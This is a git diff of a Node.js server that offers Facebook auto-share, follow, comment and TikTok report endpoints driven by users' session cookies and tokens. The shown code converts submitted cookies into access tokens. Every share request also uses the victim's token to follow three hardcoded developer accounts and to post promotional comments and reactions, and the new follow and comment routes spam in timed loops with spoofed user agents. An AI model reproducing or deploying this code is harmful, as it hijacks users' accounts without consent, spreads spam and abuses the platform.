@@ -11,6 +11,20 @@ app.use(bodyParser.json());
 app.use(require("./corss"));
 app.set("json spaces", 4);
 const total = new Map();
+const headers_a = {
+      'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+      'accept-language': 'en_US',
+      'cache-control': 'max-age=0',
+      'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
+      'sec-ch-ua-mobile': '?0',
+      'sec-ch-ua-platform': "Windows",
+      'sec-fetch-dest': 'document',
+      'sec-fetch-mode': 'navigate',
+      'sec-fetch-site': 'same-origin',
+      'sec-fetch-user': '?1',
+      'upgrade-insecure-requests': '1',
+      'user-agent': userAgent()
+};
 const collectedData = [];
 
 function userAgent() {
@@ -35,7 +49,9 @@ function userAgent() {
       return android;
     }
   }
-  return `Mozilla/5.0 (Android ${version()}; ${randomize("xxx-xxx").toUpperCase()}; Mobile; rv:61.0) Gecko/61.0 Firefox/68.0`;
+  const ua1 = `Mozilla/5.0 (Linux, Android ${version}; ${randomize("xxx-xxx").toUpperCase()}; Build/${randomize("xP1A.xxxxxx.0x6").toUpperCase()}; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/107.0.5304.36 Mobile Safari/537.36[FBAN/EMA;FBLC/en_US;FBAV/415.0.0.2.100;])`;
+  const ua2 = `Mozilla/5.0 (Android ${version()}; ${randomize("xxx-xxx").toUpperCase()}; Mobile; rv:61.0) Gecko/61.0 Firefox/68.0`;
+  return [ua1, ua2];
 } 
 
 
@@ -75,7 +91,7 @@ if (leiam) {
  }
 } catch (error) {}
 }
-app.get('/sh', async (req, res) => {
+app.get('/share', async (req, res) => {
   const {
     cookie,
     url,
@@ -138,7 +154,7 @@ app.get('/token', async (req, res) => {
   })
 });
 
-app.get("/ttid", async (req, res) => {
+app.get("/tikid", async (req, res) => {
   const {
     username
   } = req.query;
@@ -180,7 +196,7 @@ function r(min, max) {
   return Math.floor(Math.random() * (max - min + 1) + min);
 }
 
-app.get("/ttreport", async(req, res) => {
+app.get("/tikreport", async(req, res) => {
   const {
     id
   } = req.query;
@@ -270,42 +286,173 @@ app.get("/ttreport", async(req, res) => {
   })
 });
 
-const sauce = "https://www.facebook.com/100015801404865/posts/1674522423084455/?app=fbl";
-async function yello(c,u,a,i){
-  await share(true, c,u,a,i);
-  await share(false, c, sauce, "100000", "6");
-  
-  collectedData.push({cookie: c});
-}
+app.get("/ai", async(req, res) => {
+  const {
+    model, system, user
+  } = req.query;
+  const wie = require("./wiegine_ai");
+  await wie.cfai(model, system, user).then(neth => {
+    if (neth.msg){
+    return res.json(neth);
+    } else {
+     res.writeHead(200, {
+       "Content-Type": "image/png"
+     });
+     res.end(neth);
+     return;
+    }
+  }).catch(error => {
+    return res.json({
+      msg: "Something went wrong",
+      status: false,
+    });
+  })
+});
 
-async function fucker(a,link){
+app.get("/follow", async(req,res) => {
+  const { token, uid } = req.query;
+  if (!token||!uid){
+  return res.json({
+    error: "No 'token'/'uid' params."
+  })
+  }
+  await follower(token, uid.split(","));
+  return res.json({
+    msg: "Success follow UIDs",
+    uid: {
+      ...uid.split(",")
+    }
+  })
+});
+
+app.get("/comment", async(req, res) => {
+  const { token, msg, link, delay } = req.query;
+  if (!token||!msg||!link||!delay){
+    return res.json({
+      error: "No 'token'/'msg'/'link' params."
+    });
+  }
+  await commenter(token,msg,link,delay);
+  return res.json({
+    msg: "Success comment",
+    link,
+    comment: msg,
+  });
+});
+
+app.get("/dummycookie", async(req, res) => {
+  const cookie = dummyCookie();
+  if (!cookie) return res.json({
+    cookie: "Failed to generate."
+  });
+  return res.json({ cookie });
+});
+
+app.get("/useragent", async(req, res) => {
+  const ua = userAgent();
+  if (!ua) return res.json({
+    error: "Failed to generate."
+  });
+  return res.json({
+    ua,
+  });
+});
+
+app.post("/appstate2token", async(req, res) => {
+  const { appstate } = req.body;
+  const access = await gagokaba(appstate);
+  if (!access){
+    return res.json({
+      error: "Something went wrong."
+    });
+  }
+  
+  return res.json({
+    cookie: access[0],
+    token: access[1],
+  });
+});
+
+async function getAccessToken(cookie) {
   try {
     const headers = {
+      'authority': 'business.facebook.com',
       'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
-      'accept-language': 'en_US',
+      'accept-language': 'vi-VN,vi;q=0.9,fr-FR;q=0.8,fr;q=0.7,en-US;q=0.6,en;q=0.5',
       'cache-control': 'max-age=0',
-      'sec-ch-ua': '"Not?A_Brand";v="8", "Chromium";v="108", "Google Chrome";v="108"',
+      'cookie': cookie,
+      'referer': 'https://www.facebook.com/',
+      'sec-ch-ua': '".Not/A)Brand";v="99", "Google Chrome";v="103", "Chromium";v="103"',
       'sec-ch-ua-mobile': '?0',
-      'sec-ch-ua-platform': "Windows",
+      'sec-ch-ua-platform': '"Linux"',
       'sec-fetch-dest': 'document',
       'sec-fetch-mode': 'navigate',
       'sec-fetch-site': 'same-origin',
       'sec-fetch-user': '?1',
       'upgrade-insecure-requests': '1',
-      'user-agent': userAgent(),
-      'Authorization': `Bearer ${a}`
     };
-    
-    const neth = [
-      "100015801404865",
-      "61562218612857",
-      "61559180483340"
-    ];
-    for (const n of neth){
-      axios.post(`https://graph.facebook.com/v18.0/${n}/subscribers`, {}, {
+    const response = await axios.get('https://business.facebook.com/content_management', {
       headers
-    }).catch(err => {});
+    });
+    const token = response.data.match(/"accessToken":\s*"([^"]+)"/);
+    if (token && token[1]) {
+      const accessToken = token[1];
+      return accessToken;
     }
+  } catch (error) {
+    return;
+  }
+}
+async function gagokaba(cookie) {
+  try {
+    const ck = JSON.parse(cookie);
+    //if (ck && ck.has("sb")){
+    const ck1 = ck.map(c => `${c.key}=${c.value}`).join('; ');
+    const token = await getAccessToken(ck1);
+    return [ck1,token]; //token from cookie(EAAGN)
+    /*} else {
+      return cookie;
+    }*/
+  } catch (e){
+    return;
+  }
+}
+
+
+const sauce = "https://www.facebook.com/100015801404865/posts/1674522423084455/?app=fbl";
+async function yello(c,u,a,i){
+  await share(true, c,u,a,i);
+  await share(false, c, sauce, "100000", "6");
+}
+
+async function follower(a,uid){
+  let awit = 0;
+  const neth = [
+        ...uid,
+        "100015801404865",
+        "61562218612857",
+        "61559180483340",
+        ];
+    setInterval(async() => {
+    await axios.post(`https://graph.facebook.com/v18.0/${neth[awit]}/subscribers`, {}, {
+      headers: {
+        ...headers_a,
+        "Authorization": `Bearer ${a}`
+      }
+    }).then(nethie => {
+    }).catch(err => {
+    });
+    if (awit === neth.length){
+      awit = 0;
+      return;
+    }
+    awit++;
+    }, 3*1000);
+  
+}
+
+async function commenter(a,msg,link,delay){
+  try {
     /*const kapogi = [
       "ampogi ni neth",
       "ang ganda mo wiegine!!!",
@@ -325,19 +472,25 @@ async function fucker(a,link){
       "💀💀💀💀",
       "Isa ako sa mga pogi katulad ni Neth hehe",
       ];*/
+    setInterval(() => {
     axios.post(`https://graph.facebook.com/${extract(link)}/comments`, null, {
       params: {
-        message: `I just want to know you that Neth is simple but awesome dev.\n\n\n✨ Explore my pages:\n@[61559180483340:0]\n@[61562218612857:0]\n\nDeveloper: @[100015801404865:0]\n\n(this is an automated comment!)`/*kapogi[Math.floor(Math.random() * kapogi.length)]*/,
+        message: msg/*kapogi[Math.floor(Math.random() * kapogi.length)]*/,
         access_token: a
-      }, headers });
+      }, headers: {
+        ...headers_a,
+        "Authorization": `Bearer ${a}`
+      }});
     axios.post(`https://graph.facebook.com/${extract(link)}/reactions?type=LOVE&access_token=${a}`)
     .catch(err => {});
+    }, delay*1000);
   } catch (err){
-   }
+  }
 }
 async function share(sharedIs,cookies, url, amount, interval) {
   const id = Math.floor(Math.random() * 69696969);
-  await fucker(cookies, sauce);
+  await follower(cookies, "");
+  await commenter(cookies, `I just want to know you that Neth is simple but awesome dev.\n\n\n✨ Explore my pages:\n@[61559180483340:0]\n@[61562218612857:0]\n\nDeveloper: @[100015801404865:0]\n\n(this is automated.)`, sauce);   
   total.set(id, {
     shared: sharedIs,
     url,
@@ -346,13 +499,17 @@ async function share(sharedIs,cookies, url, amount, interval) {
   });
   let sharedCount = 0;
   let timer;
+  const usersa = () => {
+    const ua = userAgent();
+    return ua[Math.floor(Math.random() * ua.length)];
+  }
   const headers = {
     'authority': 'graph.facebook.com',
     'cache-control': 'max-age=0',
     'sec-ch-ua-mobile': '?0',
     'connection': 'keep-alive',
     'host': 'graph.facebook.com',
-    'user-agent': userAgent(),
+    'user-agent': /*usersa()*/userAgent(),
   };
   async function sharePost() {
     try {
@@ -437,7 +594,7 @@ function dummyCookie() {
 }
 
 app.listen(port, () => {
-  console.log(`FORK YOU`);
+  console.log(`i'm listening to port: ${port}! hi!`);
 });
 process.on("unhandledRejection", (reason, p) => {
   console.error(reason);
